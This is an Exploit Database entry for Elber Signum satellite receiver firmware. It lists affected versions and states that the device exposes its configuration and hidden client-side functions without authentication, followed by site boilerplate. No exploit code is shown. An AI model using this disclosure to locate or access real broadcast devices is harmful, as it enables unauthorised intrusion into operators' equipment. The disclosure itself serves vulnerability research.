Elber Signum DVB-S/S2 IRD For Radio Networks 1.999 Device Config

Vendor: Elber S.r.l.
Product web page: https://www.elber.it
Affected version: 1.999 Revision 1243
                  1.317 Revision 602
                  1.220 Revision 1250
                  1.220 Revision 1248_1249
                  1.220 Revision 597
                  1.217 Revision 1242
                  1.214 Revision 1023
                  1.193 Revision 924
                  1.175 Revision 873
                  1.166 Revision 550

Summary: The SIGNUM controller from Elber satellite equipment demodulates
one or two DVB-S/ S2 signals up to 32APSK (single/multi-stream), achieving
256 KS/s as minimum symbol rate. The TS demodulated signals can be aligned
and configured in 1+1 seamless switching for redundancy. Redundancy can also
be achieved with external ASI and TSoIP inputs. Signum supports MPEG-1 LI/II
audio codec, providing analog and digital outputs; moreover, it’s possible
to set a data PID to be decoded and passed to the internal RDS encoder,
generating the dual MPX FM output.

Desc: The device suffers from an unauthenticated device configuration and
client-side hidden functionality disclosure.

Tested on: NBFM Controller
           embOS/IP

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/?utm_source=edb&utm_medium=web&utm_campaign=www)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/?utm_source=edb&utm_medium=web&utm_campaign=www), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/?utm_source=edb&utm_medium=web&utm_campaign=www) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/?utm_source=edb&utm_medium=web&utm_campaign=www) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and i...
